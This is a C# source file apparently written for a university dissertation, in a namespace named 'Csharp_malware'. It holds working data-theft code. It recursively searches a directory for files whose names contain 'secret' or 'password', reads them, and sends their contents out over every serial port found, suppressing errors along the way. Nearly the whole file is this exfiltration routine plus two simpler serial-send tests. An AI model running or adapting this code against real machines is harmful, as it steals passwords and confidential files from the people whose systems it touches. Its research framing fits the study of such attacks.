using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Ports;
using System.Linq;

namespace Csharp_malware
{
	class Program {
		static void Main(string[] args) {
			// Get a list of serial port names.
			string[] ports = SerialPort.GetPortNames();

			if (ports.Length != 0) { // Make sure at least one port
				foreach (string port in ports) {
					try	{
						//serialTest1(port, 115200);
						//serialTest2(port, 115200, "C:\\Users\\sebpa\\Documents\\University Work\\Dissertation\\Test Folder 1\\Test Folder 3\\test file 3.txt");
						searchFilesystem("C:\\Users\\sebpa\\Documents\\University Work\\Year 4 - MSc\\Dissertation\\Example Root Dir", port, 115200);
					}
					catch { }
				}
			}
			else {
				Console.WriteLine("No active serial ports were found!");
			}
			// Stop the program from exiting immediately
			//Console.ReadLine();
		}

		// Serial port test 1 - Send text over serial
		private static void serialTest1(string portName, int baudRate) {
			SerialPort port = new SerialPort(portName, baudRate);
			port.Open();
			for (int i = 0; i < 2; i++)	{
				// Test data format - Serial Test (ST) number:Data piece number
				port.WriteLine("ST1:D" + i);
			}
			Console.WriteLine("Test data has been sent!");
			port.Close();
		}

		// Serial port test 2 - Send text from known file over serial
		private static void serialTest2(string portName, int baudRate, string knownFilePath) {
			SerialPort port = new SerialPort(portName, baudRate);
			port.Open();

			string text = File.ReadAllText(knownFilePath);
			port.WriteLine(text);

			Console.WriteLine("Test data has been sent!");
			port.Close();
		}

		// Final method - Send text from interesting file, starting search at a given root dir
		private static void searchFilesystem(string rootDir, string portName, int baudRate)
		{
			SerialPort port = new SerialPort(portName, baudRate);
			port.Open();

			// Declare the keywords that we are interested in
			string[] keywords = { "secret", "password" };

			Console.WriteLine("Looking for interesting files...");

			// Get a list of all the files from the specified root dir + subdirs
			IEnumerable<string> fileList = GetFiles(rootDir, "*.*");

			for (int i = 0; i < 3; i++) { // Give it 3 chances to send correct data
				port.WriteLine("<<>>");
				// Loop over each file found
				foreach (string file in fileList) {
					if (keywords.Any(file.Contains)) {
						try {
							Console.WriteLine("Interesting file found: {0}", file);
							string fileContents = File.ReadAllText(file);
							port.WriteLine(file + "~" + fileContents);
						}
						catch {
							//Console.WriteLine("Error reading file: {0}", file);
							continue;
						}
					}
				}
			}
			Console.WriteLine("All data has been sent!");
			port.Close();
		}

		// https://stackoverflow.com/questions/4986293/access-to-the-path-is-denied-when-using-directory-getfiles
		public static IEnumerable<string> GetFiles(string root, string searchPattern) {
			Stack<string> pending = new Stack<string>();
			pending.Push(root);
			while (pending.Count != 0) {
				var path = pending.Pop();
				string[] next = null;
				try	{
					next = Directory.GetFiles(path, searchPattern);
				}
				catch {
					//Console.WriteLine("Access denied to: " + path);
				}
				if (next != null && next.Length != 0)
					foreach (var file in next) yield return file;
				try {
					next = Directory.GetDirectories(path);
					foreach (var subdir in next) pending.Push(subdir);
				}
				catch { }
			}
		}

	}
}